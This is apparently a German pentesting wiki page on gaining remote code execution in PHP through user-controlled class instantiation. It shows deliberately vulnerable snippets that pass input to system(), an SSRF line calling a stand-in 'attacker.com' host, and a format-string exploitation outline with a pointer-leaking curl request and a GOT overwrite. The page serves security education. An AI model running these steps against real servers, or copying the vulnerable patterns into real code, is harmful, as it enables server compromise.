# PHP - RCE durch Ausnutzung der Objekt-Erstellung: new $_GET["a"]($_GET["b"])

{{#include ../../../banners/hacktricks-training.md}}

Dies ist im Wesentlichen eine Zusammenfassung von [https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/](https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/)

## Einführung

Die Erstellung neuer beliebiger Objekte, wie `new $_GET["a"]($_GET["a"])`, kann zu Remote Code Execution (RCE) führen, wie in einem [**writeup**](https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/) beschrieben. Dieses Dokument stellt verschiedene Strategien zur Erreichung von RCE vor.

## RCE via Custom Classes or Autoloading

Die Syntax `new $a($b)` wird verwendet, um ein Objekt zu instanziieren, wobei **`$a`** den Klassennamen darstellt und **`$b`** das erste Argument ist, das an den Konstruktor übergeben wird. Diese Variablen können aus Benutzereingaben wie GET/POST stammen, wo sie Strings oder Arrays sein können, oder aus JSON, wo sie als andere Typen auftreten können.

Betrachte den folgenden Codeausschnitt:
```php
class App {
function __construct ($cmd) {
system($cmd);
}
}

class App2 {
function App2 ($cmd) {
system($cmd);
}
}

$a = $_GET['a'];
$b = $_GET['b'];

new $a($b);
```
In diesem Fall führt das Setzen von `$a` auf `App` oder `App2` und `$b` auf einen Systembefehl (z. B. `uname -a`) zur Ausführung dieses Befehls.

**Autoloading-Funktionen** können ausgenutzt werden, wenn solche Klassen nicht direkt zugänglich sind. Diese Funktionen laden Klassen automatisch aus Dateien, wenn sie benötigt werden, und werden mit `spl_autoload_register` oder `__autoload` definiert:
```php
spl_autoload_register(function ($class_name) {
include './../classes/' . $class_name . '.php';
});

function __autoload($class_name) {
include $class_name . '.php';
};

spl_autoload_register();
```
Das Verhalten des Autoloadings variiert je nach PHP-Version und bietet unterschiedliche RCE-Möglichkeiten.

## RCE über eingebaute Klassen

Fehlen eigene Klassen oder Autoloader, können **eingebaute PHP-Klassen** für RCE ausreichen. Die Anzahl dieser Klassen liegt je nach PHP-Version und installierten Erweiterungen zwischen etwa 100 und 200. Sie lassen sich mit `get_declared_classes()` auflisten.

Interessante Konstruktoren lassen sich über die Reflection-API identifizieren, wie im folgenden Beispiel und im Link [https://3v4l.org/2JEGF](https://3v4l.org/2JEGF) gezeigt.

**Zu spezifischen Methoden für RCE gehören:**

### **SSRF + Phar Deserialization**

Die Klasse `SplFileObject` ermöglicht SSRF über ihren Konstruktor und erlaubt Verbindungen zu beliebigen URLs:
```php
new SplFileObject('http://attacker.com/');
```
SSRF kann in Versionen von PHP vor 8.0 unter Verwendung des Phar-Protokolls zu deserialization attacks führen.

### **Exploiting PDOs**

Der Konstruktor der PDO-Klasse erlaubt Verbindungen zu Datenbanken über DSN-Strings und kann möglicherweise die Erstellung von Dateien oder andere Interaktionen ermöglichen:
```php
new PDO("sqlite:/tmp/test.txt")
```
### **SoapClient/SimpleXMLElement XXE**

PHP-Versionen bis einschließlich 5.3.22 und 5.4.12 waren anfällig für XXE-Angriffe über die `SoapClient`- und `SimpleXMLElement`-Konstruktoren, abhängig von der libxml2-Version.

## RCE über die Imagick-Erweiterung

Bei der Analyse der **Projektabhängigkeiten** wurde festgestellt, dass **Imagick** durch Instanziieren neuer Objekte für **command execution** missbraucht werden kann. Dies eröffnet Möglichkeiten zur Ausnutzung von Schwachstellen.

### VID parser

Es wurde festgestellt, dass der VID-Parser Inhalte an beliebige Pfade im Dateisystem schreiben kann. Dadurch könnte eine PHP-Shell in ein webzugängliches Verzeichnis abgelegt werden, was Remote Code Execution (RCE) ermöglicht.

#### VID Parser + File Upload

Es ist zu beachten, dass PHP hochgeladene Dateien temporär in `/tmp/phpXXXXXX` speichert. Der VID-Parser in Imagick, der das **msl**-Protokoll verwendet, kann Wildcards in Dateipfaden verarbeiten und so die Übertragung der temporären Datei an einen gewählten Ort ermöglichen. Diese Methode bietet einen zusätzlichen Ansatz, beliebiges Dateischreiben im Dateisystem zu erreichen.

### PHP Crash + Brute Force

Eine in der [**original writeup**](https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/) beschriebene Methode beinhaltet das Hochladen von Dateien, die einen Serverabsturz vor der Löschung auslösen. Durch Brute-Forcing des Namens der temporären Datei kann Imagick beliebigen PHP-Code ausführen. Diese Technik funktionierte jedoch nur in einer veralteten Version von ImageMagick.

## Format-string in class-name resolution (PHP 7.0.0 Bug #71105)

Wenn Benutzereingaben den Klassennamen kontrollieren (z.B., `new $_GET['model']()`), führte PHP 7.0.0 im Zuge des `Throwable`-Refactorings einen temporären Bug ein, bei dem die Engine fälschlicherweise den Klassennamen während der Auflösung als printf-Formatstring behandelte. Dies ermöglicht klassische printf-style primitives inside PHP: leaks with `%p`, write-count control with width specifiers, and arbitrary writes with `%n` against in-process pointers (for example, GOT entries on ELF builds).

Minimales reproduzierbares verwundbares Muster:
```php
<?php
$model = $_GET['model'];
$object = new $model();
```
Exploitation outline (aus der Referenz):
- Leak addresses via `%p` im Klassennamen, um ein beschreibbares Ziel zu finden:
```bash
curl "http://host/index.php?model=%p-%p-%p"
# Fatal error includes resolved string with leaked pointers
```
- Verwende positionale Parameter und width specifiers, um eine exakte Byte-Anzahl zu setzen, dann `%n`, um diesen Wert an eine auf dem stack erreichbare Adresse zu schreiben, ziele auf einen GOT slot (z.B. `free`), um ihn teilweise zu `system` zu überschreiben.
- Trigger die hijacked function, indem ein Klassenname mit einer shell pipe übergeben wird, um `system("id")` aufzurufen.

Anmerkungen:
- Funktioniert nur unter PHP 7.0.0 (Bug [#71105](https://bugs.php.net/bug.php?id=71105)); in späteren Releases behoben. Schweregrad: kritisch, falls arbitrary class instantiation vorhanden ist.
- Typische payloads verketten viele `%p`, um den stack zu durchsuchen, und nutzen dann `%.<width>d%<pos>$n`, um die partielle Überschreibung zu platzieren.

## Referenzen

- [https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/](https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/)
- [The Art of PHP: CTF‑born exploits and techniques](https://blog.orange.tw/posts/2025-08-the-art-of-php-ch/)

{{#include ../../../banners/hacktricks-training.md}}
